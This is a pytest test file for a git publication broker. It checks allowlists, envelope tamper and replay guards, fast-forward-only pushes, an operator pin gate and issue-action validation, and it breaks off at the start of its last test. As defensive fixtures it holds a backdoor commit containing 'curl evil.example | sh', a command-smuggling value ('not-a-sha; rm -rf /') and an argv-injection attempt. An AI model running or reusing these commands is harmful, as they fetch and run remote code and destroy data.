"""orchestrator/broker.py — Component C of the publication broker
(docs/plans/2026-08-06-publication-broker-design.md), hardened by the security fix round
(2026-08-07 — CRITICAL-1 through IMPORTANT-4, see broker.py's own module docstring for
the corrected authority line: allowlist authorizes DESTINATION, pin store authorizes
CONTENT, spent ledger is the replay-guard authority).

Hermetic end-to-end: real `git` against real local repos (file-path "remotes" — no
network), so ls-remote/merge-base/cat-file exercise real git semantics; `gh` is the only
faked seam (this machine has no real GitHub). Nothing here touches /Users/Shared or the
network — every operator-owned path (pins/spent/processed) is under `tmp_path`.
"""
import json
import subprocess
from datetime import datetime, timedelta, timezone

from factory.common import harness_surface as hs
from factory.common.frozen_source import _is_frozen
from factory.orchestrator import broker
from factory.reporting import envelope


def _git(args, cwd, check=True):
    r = subprocess.run(["git", "-C", str(cwd), *args], capture_output=True, text=True, timeout=30)
    if check:
        assert r.returncode == 0, f"git -C {cwd} {args} failed: {r.stderr}"
    return r.stdout.strip()


def _init_repo(path, branch="base"):
    path.mkdir(parents=True, exist_ok=True)
    subprocess.run(["git", "init", "-q", "-b", branch, str(path)], check=True,
                   capture_output=True)
    _git(["config", "user.email", "t@example.com"], path)
    _git(["config", "user.name", "Test"], path)


def _commit(path, name, msg):
    (path / name).write_text(msg, encoding="utf-8")
    _git(["add", "-A"], path)
    _git(["commit", "-q", "-m", msg], path)
    return _git(["rev-parse", "HEAD"], path)


class _Runner:
    """Real git via subprocess; `gh` calls are faked (canned rc, recorded for asserts)."""
    def __init__(self, gh_rc=0, gh_out="ok"):
        self.calls = []
        self.gh_rc, self.gh_out = gh_rc, gh_out

    def __call__(self, argv, **kw):
        self.calls.append(list(argv))
        if argv[0] == "gh":
            return subprocess.CompletedProcess(argv, self.gh_rc, stdout=self.gh_out, stderr="")
        return subprocess.run(argv, **kw)

    def gh_subcmds(self):
        return [a[2] for a in self.calls if a[0] == "gh" and len(a) > 2]


def _rig(tmp_path):
    """A remote 'GitHub' bare repo + a local bare 'spool' repo already carrying a
    candidate tip one commit ahead of the remote's base — the exact state
    graduate_and_prepare_envelope leaves behind. Returns
    (remote_bare, bare_path, work, base_sha, tip_sha, entry)."""
    remote_bare = tmp_path / "remote.git"
    subprocess.run(["git", "init", "--bare", "-q", "-b", "base", str(remote_bare)],
                   check=True, capture_output=True)

    work = tmp_path / "work"
    _init_repo(work, branch="base")
    _git(["remote", "add", "origin", str(remote_bare)], work)
    base_sha = _commit(work, "f.txt", "first")
    _git(["push", "-q", "origin", "base"], work)

    bare_path = tmp_path / "bare.git"
    subprocess.run(["git", "init", "--bare", "-q", str(bare_path)], check=True,
                   capture_output=True)
    tip_sha = _commit(work, "f.txt", "second")
    _git(["push", "-q", str(bare_path), "HEAD:refs/heads/base"], work)

    entry = {"repo_slug": "o/r", "remote_url": str(remote_bare), "base_branch": "base",
             "bare_path": str(bare_path), "allow_issue_ops": True}
    return remote_bare, bare_path, work, base_sha, tip_sha, entry


def _env_for(rig, **over):
    _, _, _, base_sha, tip_sha, entry = rig
    kw = dict(action="graduate", repo_slug=entry["repo_slug"], base_branch=entry["base_branch"],
             base_sha=base_sha, tip_sha=tip_sha, range_=f"{base_sha}..{tip_sha}", n_commits=1,
             approval_id=1, policy_hash="ph",
             issue_actions=[{"op": "close", "number": 12, "body": "closes #12"}])
    kw.update(over)
    return envelope.build_envelope(**kw)


def _authority_paths(tmp_path):
    """The operator-owned pin/spent paths every verify_envelope/run_once call needs —
    fresh, empty, under tmp_path (never /Users/Shared, never touched by network)."""
    return str(tmp_path / "pins"), str(tmp_path / "spent")


def _verify(env, *, hash_path, allowlist, tmp_path, filename_nonce=None, runner=None):
    pins_path, spent_path = _authority_paths(tmp_path)
    return broker.verify_envelope(
        env, filename_nonce=filename_nonce or (env or {}).get("nonce", ""),
        hash_path=hash_path, allowlist=allowlist, spent_path=spent_path,
        pins_path=pins_path, runner=runner or _Runner())


# -- load_allowlist / find_entry -----------------------------------------------------------
def test_load_allowlist_missing_file_is_empty(tmp_path):
    assert broker.load_allowlist(str(tmp_path / "nope.yaml")) == []


def test_load_allowlist_malformed_yaml_is_empty(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text("publications: [this is not: valid: yaml:", encoding="utf-8")
    assert broker.load_allowlist(str(p)) == []


def test_load_allowlist_parses_publications(tmp_path):
    p = tmp_path / "allow.yaml"
    p.write_text(
        "publications:\n"
        "  - repo_slug: o/r\n"
        "    remote_url: git@github.com:o/r.git\n"
        "    base_branch: base\n"
        "    bare_path: /tmp/bare.git\n"
        "    allow_issue_ops: true\n", encoding="utf-8")
    rows = broker.load_allowlist(str(p))
    assert len(rows) == 1 and rows[0]["repo_slug"] == "o/r"


def test_find_entry_matches_repo_and_branch():
    allow = [{"repo_slug": "o/r", "base_branch": "base"},
            {"repo_slug": "o/r", "base_branch": "main"}]
    got = broker.find_entry(allow, {"repo_slug": "o/r", "base_branch": "main"})
    assert got == allow[1]


def test_find_entry_none_when_no_match():
    assert broker.find_entry([{"repo_slug": "a/b", "base_branch": "x"}],
                             {"repo_slug": "o/r", "base_branch": "base"}) is None


# T1 (mutation-survivor fix, integration review round 1): a NON-EMPTY allowlist whose
# every entry is a NON-match must still refuse — proves find_entry (not "the allowlist
# just happened to be non-empty") is what gates destination authorization.
def test_find_entry_none_when_allowlist_is_nonempty_but_all_entries_mismatch():
    allow = [{"repo_slug": "other/repo", "base_branch": "base"},
            {"repo_slug": "o/r", "base_branch": "totally-different-branch"}]
    assert broker.find_entry(allow, {"repo_slug": "o/r", "base_branch": "base"}) is None


def test_verify_rejects_when_allowlist_nonempty_but_no_entry_matches(tmp_path):
    rig = _rig(tmp_path)
    env = _env_for(rig)
    decoy = [{"repo_slug": "decoy/repo", "remote_url": "x", "base_branch": "base",
             "bare_path": "/nope"}]
    outbox = tmp_path / "outbox"
    _, hash_path = envelope.write_envelope(env, str(outbox))
    v = _verify(env, hash_path=hash_path, allowlist=decoy, tmp_path=tmp_path)
    assert v["ok"] is False and "no allowlist entry" in v["reason"]


# T2 (mutation-survivor fix): destination (remote_url/bare_path) must come from the
# ALLOWLIST entry only — an envelope cannot smuggle its own destination fields in.
def test_execute_envelope_ignores_envelope_supplied_destination_fields(tmp_path):
    rig = _rig(tmp_path)
    remote_bare, _, _, base_sha, tip_sha, entry = rig
    env = _env_for(rig, issue_actions=[])
    env["bare_path"] = "/should/never/be/read"
    env["remote_url"] = "/should/never/be/read/either"
    out = broker.execute_envelope(env, entry, runner=_Runner())
    assert out["ok"] is True
    live = _git(["ls-remote", str(remote_bare), "refs/heads/base"], tmp_path)
    assert live.split()[0] == tip_sha        # pushed to the REAL (allowlist) remote


# -- verify_envelope: drill-3 matrix (destination + liveness checks) -----------------------
def test_verify_happy_path_requires_a_pin_by_default(tmp_path):
    """require_pin defaults True: EVERY other check passing is not enough on its own —
    this is the whole point of the security fix round."""
    rig = _rig(tmp_path)
    _, _, _, _, tip_sha, entry = rig
    env = _env_for(rig)
    outbox = tmp_path / "outbox"
    _, hash_path = envelope.write_envelope(env, str(outbox))
    v = _verify(env, hash_path=hash_path, allowlist=[entry], tmp_path=tmp_path)
    assert v["ok"] is False and v["status"] == "unpinned"
    assert tip_sha[:9] in v["reason"]
    assert v["entry"] == entry


def test_verify_happy_path_with_a_pin_is_ok(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, tip_sha, entry = rig
    env = _env_for(rig)
    outbox = tmp_path / "outbox"
    _, hash_path = envelope.write_envelope(env, str(outbox))
    pins_path, spent_path = _authority_paths(tmp_path)
    broker.pin_tip(pins_path, tip_sha, note="reviewed")
    v = broker.verify_envelope(env, filename_nonce=env["nonce"], hash_path=hash_path,
                               allowlist=[entry], spent_path=spent_path, pins_path=pins_path,
                               runner=_Runner())
    assert v == {"ok": True, "entry": entry}


def test_verify_require_pin_false_skips_the_pin_gate(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, _, entry = rig
    entry = dict(entry, require_pin=False)
    env = _env_for(rig)
    outbox = tmp_path / "outbox"
    _, hash_path = envelope.write_envelope(env, str(outbox))
    v = _verify(env, hash_path=hash_path, allowlist=[entry], tmp_path=tmp_path)
    assert v == {"ok": True, "entry": entry}


def test_verify_rejects_base_moved_since_approval(tmp_path):
    """Drill 3's exact case: the operator (or anyone) pushed something else to the real
    remote's base branch after the envelope was prepared — the pinned base_sha is stale."""
    rig = _rig(tmp_path)
    remote_bare, _, work, _, _, entry = rig
    env = _env_for(rig)
    # someone else moves the remote base branch
    other = tmp_path / "other"
    _init_repo(other, branch="base")
    _git(["remote", "add", "origin", str(remote_bare)], other)
    _git(["fetch", "-q", "origin", "base"], other)
    _git(["checkout", "-q", "base"], other)
    (other / "g.txt").write_text("intruding change", encoding="utf-8")
    _git(["add", "-A"], other)
    _git(["commit", "-q", "-m", "moved"], other)
    _git(["push", "-q", "origin", "base"], other)

    outbox = tmp_path / "outbox"
    _, hash_path = envelope.write_envelope(env, str(outbox))
    v = _verify(env, hash_path=hash_path, allowlist=[entry], tmp_path=tmp_path)
    assert v["ok"] is False and v["status"] == "rejected"
    assert "base moved" in v["reason"]


def test_verify_rejects_tampered_envelope(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, _, entry = rig
    env = _env_for(rig)
    outbox = tmp_path / "outbox"
    json_path, hash_path = envelope.write_envelope(env, str(outbox))
    tampered = dict(env, n_commits=999)     # the file on disk no longer matches its hash
    with open(json_path, "w", encoding="utf-8") as fh:
        json.dump(tampered, fh)
    reread = envelope.read_envelope(json_path)
    v = _verify(reread, hash_path=hash_path, allowlist=[entry], tmp_path=tmp_path,
               filename_nonce=env["nonce"])
    assert v["ok"] is False and v["status"] == "rejected"
    assert "hash" in v["reason"]


def test_verify_rejects_a_spent_nonce_replay(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, _, entry = rig
    env = _env_for(rig)
    outbox = tmp_path / "outbox"
    _, hash_path = envelope.write_envelope(env, str(outbox))
    pins_path, spent_path = _authority_paths(tmp_path)
    broker.mark_spent(spent_path, env["nonce"], status="pushed")
    v = broker.verify_envelope(env, filename_nonce=env["nonce"], hash_path=hash_path,
                               allowlist=[entry], spent_path=spent_path, pins_path=pins_path,
                               runner=_Runner())
    assert v["ok"] is False and v["status"] == "rejected"
    assert "replay" in v["reason"] or "spent" in v["reason"]


# IMPORTANT-2's exact regression: deleting the (factory-writable, informational) spool
# receipt copy must NOT un-spend a nonce — the ledger, not the receipt file, is authority.
def test_deleting_the_spool_receipt_does_not_unspend_the_nonce(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, _, entry = rig
    env = _env_for(rig)
    outbox = tmp_path / "outbox"
    _, hash_path = envelope.write_envelope(env, str(outbox))
    pins_path, spent_path = _authority_paths(tmp_path)
    receipts_dir = tmp_path / "receipts"
    broker.mark_spent(spent_path, env["nonce"], status="pushed")
    envelope.write_receipt(nonce=env["nonce"], status="pushed", receipts_dir=str(receipts_dir))
    # the factory user CAN write/delete in the shared spool — simulate that
    import os
    os.remove(str(receipts_dir / f"{env['nonce']}.receipt.json"))
    assert envelope.has_receipt(str(receipts_dir), env["nonce"]) is False   # copy is gone
    v = broker.verify_envelope(env, filename_nonce=env["nonce"], hash_path=hash_path,
                               allowlist=[entry], spent_path=spent_path, pins_path=pins_path,
                               runner=_Runner())
    assert v["ok"] is False and v["status"] == "rejected"
    assert "spent" in v["reason"] or "replay" in v["reason"]   # STILL refused


# IMPORTANT-3's exact regression: filename nonce and envelope-content nonce must be a
# SINGLE identity — desynchronizing them must not bypass the spend/replay guard.
def test_verify_rejects_when_filename_nonce_differs_from_content_nonce(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, _, entry = rig
    env = _env_for(rig, nonce="bbbbbbbb")
    outbox = tmp_path / "outbox"
    json_path, hash_path = envelope.write_envelope(env, str(outbox))
    assert json_path.endswith("bbbbbbbb.json")
    reread = envelope.read_envelope(json_path)     # content nonce == 'bbbbbbbb'
    v = _verify(reread, hash_path=hash_path, allowlist=[entry], tmp_path=tmp_path,
               filename_nonce="aaaaaaaa")           # the FILENAME says something else
    assert v["ok"] is False and v["status"] == "rejected"
    assert "nonce mismatch" in v["reason"]


def test_verify_rejects_malformed_nonce_before_using_it_as_a_path_component(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, _, entry = rig
    env = _env_for(rig, nonce="short")     # fails the charset/length regex
    outbox = tmp_path / "outbox"
    _, hash_path = envelope.write_envelope(env, str(outbox))
    v = _verify(env, hash_path=hash_path, allowlist=[entry], tmp_path=tmp_path,
               filename_nonce="short")
    assert v["ok"] is False and "malformed" in v["reason"]


def test_verify_rejects_an_expired_envelope(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, _, entry = rig
    past = datetime.now(timezone.utc) - timedelta(hours=48)
    env = _env_for(rig, now=past, ttl_hours=1)
    outbox = tmp_path / "outbox"
    _, hash_path = envelope.write_envelope(env, str(outbox))
    v = _verify(env, hash_path=hash_path, allowlist=[entry], tmp_path=tmp_path)
    assert v["ok"] is False and v["status"] == "expired"


def test_verify_rejects_no_allowlist_entry(tmp_path):
    rig = _rig(tmp_path)
    env = _env_for(rig)
    outbox = tmp_path / "outbox"
    _, hash_path = envelope.write_envelope(env, str(outbox))
    v = _verify(env, hash_path=hash_path, allowlist=[], tmp_path=tmp_path)
    assert v["ok"] is False and "allowlist" in v["reason"]


def test_verify_rejects_unreadable_envelope(tmp_path):
    v = _verify(None, hash_path=str(tmp_path / "x.sha256"), allowlist=[], tmp_path=tmp_path,
               filename_nonce="aaaaaaaa")
    assert v["ok"] is False and "unreadable" in v["reason"]


def test_verify_rejects_unknown_schema_version(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, _, entry = rig
    env = _env_for(rig)
    env["schema_version"] = 999
    outbox = tmp_path / "outbox"
    # write with the tampered schema so the hash matches what verify will read back
    _, hash_path = envelope.write_envelope(env, str(outbox))
    v = _verify(env, hash_path=hash_path, allowlist=[entry], tmp_path=tmp_path)
    assert v["ok"] is False and "schema_version" in v["reason"]


def test_verify_rejects_when_tip_sha_absent_from_bare(tmp_path):
    rig = _rig(tmp_path)
    env = _env_for(rig, tip_sha="f" * 40)   # never pushed into the bare repo
    _, _, _, _, _, entry = rig
    outbox = tmp_path / "outbox"
    _, hash_path = envelope.write_envelope(env, str(outbox))
    v = _verify(env, hash_path=hash_path, allowlist=[entry], tmp_path=tmp_path)
    assert v["ok"] is False and "not an object" in v["reason"]


def test_verify_never_a_force_push_non_ancestor_rejected(tmp_path):
    """tip_sha that is NOT a descendant of base_sha (e.g. a rewritten/rebased history) must
    reject — the fast-forward-only guard."""
    rig = _rig(tmp_path)
    remote_bare, bare_path, work, base_sha, tip_sha, entry = rig
    # an UNRELATED commit, pushed into the bare repo under a different ref so cat-file
    # finds the object but it shares no ancestry with base_sha
    orphan = tmp_path / "orphan"
    _init_repo(orphan, branch="orphan")
    orphan_sha = _commit(orphan, "o.txt", "unrelated history")
    _git(["push", "-q", str(bare_path), "HEAD:refs/heads/orphan-holder"], orphan)
    env = _env_for(rig, tip_sha=orphan_sha)
    outbox = tmp_path / "outbox"
    _, hash_path = envelope.write_envelope(env, str(outbox))
    v = _verify(env, hash_path=hash_path, allowlist=[entry], tmp_path=tmp_path)
    assert v["ok"] is False and "fast-forward" in v["reason"]


# -- CRITICAL-1's own probe, verbatim: an unpinned factory-chosen tip must never reach the
# real remote, unattended; WITH an operator pin it is accepted. -----------------------------
def test_critical1_unpinned_malicious_tip_never_reaches_the_real_remote(tmp_path):
    """The exact original vulnerability: a compromised factory can choose ANY commit that
    is a fast-forward descendant of the approved base (here literally 'adds a backdoor')
    and have it verify clean on destination/liveness alone. require_pin closes it."""
    rig = _rig(tmp_path)
    remote_bare, bare_path, work, base_sha, _, entry = rig
    backdoor_sha = _commit(work, "backdoor.sh", "curl evil.example | sh")
    _git(["push", "-q", str(bare_path), "HEAD:refs/heads/base"], work)
    env = _env_for(rig, tip_sha=backdoor_sha)
    outbox = tmp_path / "outbox"
    receipts = tmp_path / "receipts"
    pins_path, spent_path = _authority_paths(tmp_path)
    processed = tmp_path / "processed"
    envelope.write_envelope(env, str(outbox))
    allow_path = tmp_path / "allow.yaml"
    allow_path.write_text(
        f"publications:\n  - repo_slug: {entry['repo_slug']}\n"
        f"    remote_url: {entry['remote_url']}\n    base_branch: {entry['base_branch']}\n"
        f"    bare_path: {entry['bare_path']}\n    allow_issue_ops: true\n", encoding="utf-8")

    results = broker.run_once(outbox_dir=str(outbox), receipts_dir=str(receipts),
                              allowlist_path=str(allow_path), spent_path=spent_path,
                              pins_path=pins_path, processed_dir=str(processed),
                              unattended=True, runner=_Runner())
    assert results == [{"nonce": env["nonce"], "status": "pending", "reason": results[0]["reason"]}]
    live = _git(["ls-remote", str(remote_bare), "refs/heads/base"], tmp_path)
    assert live.split()[0] == base_sha              # the backdoor NEVER reached the real remote
    assert envelope.list_outbox(str(outbox)) == [env["nonce"]]   # left for a future retry
    assert broker.is_spent(spent_path, env["nonce"]) is False    # NOT spent — retryable

    # now the operator actually reviews and approves it
    broker.pin_tip(pins_path, backdoor_sha, note="reviewed on purpose for this test")
    results2 = broker.run_once(outbox_dir=str(outbox), receipts_dir=str(receipts),
                               allowlist_path=str(allow_path), spent_path=spent_path,
                               pins_path=pins_path, processed_dir=str(processed),
                               unattended=True, runner=_Runner())
    assert results2 == [{"nonce": env["nonce"], "status": "pushed"}]
    live2 = _git(["ls-remote", str(remote_bare), "refs/heads/base"], tmp_path)
    assert live2.split()[0] == backdoor_sha         # only AFTER an explicit operator pin


# -- pin store --------------------------------------------------------------------------------
def test_pin_then_is_pinned(tmp_path):
    p = str(tmp_path / "pins")
    sha = "a" * 40
    assert broker.is_pinned(p, sha) is False
    broker.pin_tip(p, sha, note="ok")
    assert broker.is_pinned(p, sha) is True
    assert broker.list_pins(p)[sha]["note"] == "ok"


def test_pin_rejects_a_malformed_sha(tmp_path):
    import pytest
    with pytest.raises(ValueError):
        broker.pin_tip(str(tmp_path / "pins"), "not-a-sha; rm -rf /")


def test_unpin_removes_and_reports(tmp_path):
    p = str(tmp_path / "pins")
    sha = "b" * 40
    assert broker.unpin_tip(p, sha) is False
    broker.pin_tip(p, sha)
    assert broker.unpin_tip(p, sha) is True
    assert broker.is_pinned(p, sha) is False


def test_load_pins_missing_or_corrupt_file_is_empty(tmp_path):
    assert broker.load_pins(str(tmp_path / "nope")) == {}
    p = tmp_path / "pins"
    p.write_text("not json", encoding="utf-8")
    assert broker.load_pins(str(p)) == {}


def test_pin_store_is_600(tmp_path):
    import stat
    p = str(tmp_path / "pins")
    broker.pin_tip(p, "c" * 40)
    mode = stat.S_IMODE(__import__("os").stat(p).st_mode)
    assert mode == 0o600


# -- spent ledger -----------------------------------------------------------------------------
def test_mark_spent_then_is_spent(tmp_path):
    p = str(tmp_path / "spent")
    assert broker.is_spent(p, "aaaaaaaa") is False
    broker.mark_spent(p, "aaaaaaaa", status="pushed")
    assert broker.is_spent(p, "aaaaaaaa") is True


def test_spent_ledger_is_append_only_across_multiple_marks(tmp_path):
    p = str(tmp_path / "spent")
    broker.mark_spent(p, "nonce-1", status="pushed")
    broker.mark_spent(p, "nonce-2", status="rejected")
    spent = broker.load_spent(p)
    assert spent == {"nonce-1", "nonce-2"}


def test_load_spent_skips_a_corrupt_line_without_losing_the_rest(tmp_path):
    p = tmp_path / "spent"
    p.write_text('{"nonce": "good-1"}\nnot json at all\n{"nonce": "good-2"}\n',
                encoding="utf-8")
    assert broker.load_spent(str(p)) == {"good-1", "good-2"}


def test_spent_ledger_is_600(tmp_path):
    import stat
    p = str(tmp_path / "spent")
    broker.mark_spent(p, "aaaaaaaa")
    mode = stat.S_IMODE(__import__("os").stat(p).st_mode)
    assert mode == 0o600


# -- issue action validation (IMPORTANT-4) ---------------------------------------------------
def test_execute_issue_action_drops_invalid_op_never_calls_gh():
    r = _Runner()
    out = broker._execute_issue_action("o/r", {"op": "delete", "number": 5, "body": "x"},
                                       runner=r)
    assert out["ok"] is False and "dropped" in out["detail"]
    assert r.calls == []


def test_execute_issue_action_drops_argv_injection_attempt_never_calls_gh():
    """The exact probe: a crafted number like '-R' is ARGUMENT injection into gh — must be
    rejected by type validation before ever touching argv, never coerced/reinterpreted."""
    r = _Runner()
    out = broker._execute_issue_action("o/r", {"op": "comment", "number": "-R", "body": "x"},
                                       runner=r)
    assert out["ok"] is False and "dropped" in out["detail"]
    assert r.calls == []


def test_execute_issue_action_drops_negative_and_zero_numbers():
    r = _Runner()
    for bad in (-1, 0, "-5", "0"):
        out = broker._execute_issue_action("o/r", {"op": "close", "number": bad, "body": "x"},
                                           runner=r)
        assert out["ok"] is False, bad
    assert r.calls == []


def test_execute_issue_action_drops_non_string_body():
    r = _Runner()
    out = broker._execute_issue_action("o/r", {"op": "comment", "number": 5, "body": 12345},
                                       runner=r)
    assert out["ok"] is False
    assert r.calls == []


def test_execute_issue_action_accepts_a_valid_action_with_dash_dash_separator():
    r = _Runner()
    out = broker._execute_issue_action("o/r", {"op": "close", "number": 12, "body": "x"},
                                       runner=r)
    assert out["ok"] is True
    comment_call = r.calls[0]
    assert comment_call[:3] == ["gh", "issue", "comment"]
    assert comment_call[-2:] == ["--", "12"]         # '--' immediately precedes the number
    close_call = r.calls[1]
    assert close_call[:3] == ["gh", "issue", "close"]
    assert close_call[-2:] == ["--", "12"]


def test_execute_envelope_caps_issue_actions_at_max():
    rig_actions = [{"op": "comment", "number": i, "body": "x"}
                  for i in range(1, broker.MAX_ISSUE_ACTIONS + 5)]
    env = {"base_branch": "base", "tip_sha": "t" * 40, "repo_slug": "o/r",
          "issue_actions": rig_actions}
    entry = {"bare_path": "/nope", "remote_url": "/nope2", "allow_issue_ops": True}

    class _PushOnlyRunner:
        def __call__(self, argv, **kw):
            if argv[0] == "git":
                return subprocess.CompletedProcess(argv, 0, stdout="", stderr="")
            return subprocess.CompletedProcess(argv, 0, stdout="ok", stderr="")

    out = broker.execute_envelope(env, entry, runner=_PushOnlyRunner())
    assert out["ok"] is True
    executed = [ir for ir in out["issue_results"] if ir.get("number") is not None]
    dropped_note = [ir for ir in out["issue_results"] if ir.get("number") is None]
    assert len(executed) == broker.MAX_ISSUE_ACTIONS
    assert len(dropped_note) == 1 and "MAX_ISSUE_ACTIONS" in dropped_note[0]["detail"]


# -- execute_envelope -----------------------------------------------------------------------
def test_execute_pushes_and_runs_issue_actions(tmp_path):
    rig = _rig(tmp_path)
    remote_bare, _, _, base_sha, tip_sha, entry = rig
    env = _env_for(rig)
    r = _Runner()
    out = broker.execute_envelope(env, entry, runner=r)
    assert out["ok"] is True and out["sha"] == tip_sha
    live = _git(["ls-remote", str(remote_bare), "refs/heads/base"], tmp_path)
    assert live.split()[0] == tip_sha                 # the real remote now has the new tip
    assert r.gh_subcmds() == ["comment", "close"]      # close op = comment then close
    # `shas`/`url` joined the result shape with F8: the receipt is the only artifact that
    # survives back to the factory, so it must carry what `record_issue_sync` needs.
    assert len(out["issue_results"]) == 1
    res = out["issue_results"][0]
    assert (res["number"], res["op"], res["ok"]) == (12, "close", True)
    assert "shas" in res


def test_execute_respects_allow_issue_ops_false(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, _, entry = rig
    entry = dict(entry, allow_issue_ops=False)
    env = _env_for(rig)
    r = _Runner()
    out = broker.execute_envelope(env, entry, runner=r)
    assert out["ok"] is True                            # push still happens
    assert r.gh_subcmds() == []                          # but no gh call at all
    assert out["issue_results"][0]["ok"] is False


def test_execute_one_gh_failure_does_not_abort_the_others(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, _, entry = rig
    env = _env_for(rig, issue_actions=[{"op": "comment", "number": 1, "body": "a"},
                                       {"op": "comment", "number": 2, "body": "b"}])
    r = _Runner(gh_rc=1, gh_out="boom")
    out = broker.execute_envelope(env, entry, runner=r)
    assert out["ok"] is True
    assert [ir["ok"] for ir in out["issue_results"]] == [False, False]
    assert len(out["issue_results"]) == 2                # both attempted


def test_execute_push_failure_reports_and_skips_issues(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, _, entry = rig
    entry = dict(entry, remote_url=str(tmp_path / "does-not-exist.git"))
    env = _env_for(rig)
    r = _Runner()
    out = broker.execute_envelope(env, entry, runner=r)
    assert out["ok"] is False and "push failed" in out["detail"]
    assert r.gh_subcmds() == []


# -- derive_publish_content / render_confirmation --------------------------------------------
def test_derive_publish_content_reads_the_real_bare_repo(tmp_path):
    rig = _rig(tmp_path)
    _, bare_path, _, base_sha, tip_sha, _ = rig
    content = broker.derive_publish_content(str(bare_path), base_sha, tip_sha, runner=_Runner())
    assert "f.txt" in content["changed_paths"]
    assert content["commits"]
    assert content["diffstat"]


def test_render_confirmation_labels_envelope_claims_as_unverified():
    env = {"nonce": "n" * 12, "action": "graduate", "repo_slug": "o/r", "base_branch": "base",
          "base_sha": "b" * 12, "tip_sha": "t" * 12, "n_commits": 99, "range": "a..b"}
    content = {"commits": "abc123 real commit", "diffstat": "1 file changed", "changed_paths": []}
    text = broker.render_confirmation(env, content)
    assert "CLAIMS 99 commit" in text and "NOT trusted" in text
    assert "abc123 real commit" in text
    assert "operator-DERIVED" in text


# -- run_once: interactive (default) vs unattended, the pin gate ----------------------------
def _allow_yaml(tmp_path, entry, *, require_pin=None):
    lines = [f"    {k}: {v}" if not isinstance(v, bool) else f"    {k}: {str(v).lower()}"
            for k, v in entry.items()]
    body = "publications:\n  - " + "\n".join(lines).lstrip()
    if require_pin is not None:
        body += f"\n    require_pin: {str(require_pin).lower()}"
    p = tmp_path / "allow.yaml"
    p.write_text(body + "\n", encoding="utf-8")
    return str(p)


def test_run_once_unattended_unpinned_is_pending_not_spent_not_archived(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, tip_sha, entry = rig
    env = _env_for(rig)
    outbox, receipts = tmp_path / "outbox", tmp_path / "receipts"
    pins_path, spent_path = _authority_paths(tmp_path)
    processed = tmp_path / "processed"
    envelope.write_envelope(env, str(outbox))
    allow_path = _allow_yaml(tmp_path, entry)
    results = broker.run_once(outbox_dir=str(outbox), receipts_dir=str(receipts),
                              allowlist_path=allow_path, spent_path=spent_path,
                              pins_path=pins_path, processed_dir=str(processed),
                              unattended=True, runner=_Runner())
    assert results[0]["status"] == "pending"
    assert envelope.list_outbox(str(outbox)) == [env["nonce"]]   # left for later
    assert broker.is_spent(spent_path, env["nonce"]) is False
    assert envelope.read_receipt(str(receipts), env["nonce"]) is None


def test_run_once_interactive_confirm_pins_and_pushes(tmp_path):
    rig = _rig(tmp_path)
    remote_bare, _, _, base_sha, tip_sha, entry = rig
    env = _env_for(rig)
    outbox, receipts = tmp_path / "outbox", tmp_path / "receipts"
    pins_path, spent_path = _authority_paths(tmp_path)
    processed = tmp_path / "processed"
    envelope.write_envelope(env, str(outbox))
    allow_path = _allow_yaml(tmp_path, entry)
    seen_prompts = []

    def confirm_fn(text):
        seen_prompts.append(text)
        return True

    results = broker.run_once(outbox_dir=str(outbox), receipts_dir=str(receipts),
                              allowlist_path=allow_path, spent_path=spent_path,
                              pins_path=pins_path, processed_dir=str(processed),
                              unattended=False, confirm_fn=confirm_fn, runner=_Runner())
    assert results == [{"nonce": env["nonce"], "status": "pushed"}]
    assert len(seen_prompts) == 1 and "operator-DERIVED" in seen_prompts[0]
    assert broker.is_pinned(pins_path, tip_sha) is True
    assert broker.is_spent(spent_path, env["nonce"]) is True
    live = _git(["ls-remote", str(remote_bare), "refs/heads/base"], tmp_path)
    assert live.split()[0] == tip_sha
    assert envelope.list_outbox(str(outbox)) == []


def test_run_once_interactive_decline_rejects_and_spends(tmp_path):
    rig = _rig(tmp_path)
    remote_bare, _, _, base_sha, tip_sha, entry = rig
    env = _env_for(rig)
    outbox, receipts = tmp_path / "outbox", tmp_path / "receipts"
    pins_path, spent_path = _authority_paths(tmp_path)
    processed = tmp_path / "processed"
    envelope.write_envelope(env, str(outbox))
    allow_path = _allow_yaml(tmp_path, entry)

    results = broker.run_once(outbox_dir=str(outbox), receipts_dir=str(receipts),
                              allowlist_path=allow_path, spent_path=spent_path,
                              pins_path=pins_path, processed_dir=str(processed),
                              unattended=False, confirm_fn=lambda text: False, runner=_Runner())
    assert results == [{"nonce": env["nonce"], "status": "rejected"}]
    receipt = envelope.read_receipt(str(receipts), env["nonce"])
    assert receipt["status"] == "rejected" and "declined" in receipt["detail"]
    assert broker.is_pinned(pins_path, tip_sha) is False
    assert broker.is_spent(spent_path, env["nonce"]) is True
    live = _git(["ls-remote", str(remote_bare), "refs/heads/base"], tmp_path)
    assert live.split()[0] == base_sha             # nothing pushed
    assert envelope.list_outbox(str(outbox)) == []
    assert (processed / f"{env['nonce']}.json").exists()


def test_run_once_pre_pinned_tip_needs_no_prompt_even_when_interactive(tmp_path):
    rig = _rig(tmp_path)
    _, _, _, _, tip_sha, entry = rig
    env = _env_for(rig)
    outbox, receipts = tmp_path / "outbox", tmp_path / "receipts"
    pins_path, spent_path = _authority_paths(tmp_path)
    processed = tmp_path / "processed"
    envelope.write_envelope(env, str(outbox))
    allow_path = _allow_yaml(tmp_path, entry)
    broker.pin_tip(pins_path, tip_sha, note="pre-approved")

    def confirm_fn(text):
        raise AssertionError("must not prompt for an already-pinned tip")

    results = broker.run_once(outbox_dir=str(outbox), receipts_dir=str(receipts),
                              allowlist_path=allow_path, spent_path=spent_path,
                              pins_path=pins_path, processed_dir=str(processed),
                              unattended=False, confirm_fn=confirm_fn, runner=_Runner())
    assert results == [{"nonce": env["nonce"], "status": "pushed"}]


def test_run_once_happy_path_writes_a_pushed_receipt_and_archives_the_outbox(tmp_path):
    rig = _rig(tmp_path)
    remote_bare, _, _, base_sha, tip_sha, entry = rig
    env = _env_for(rig)
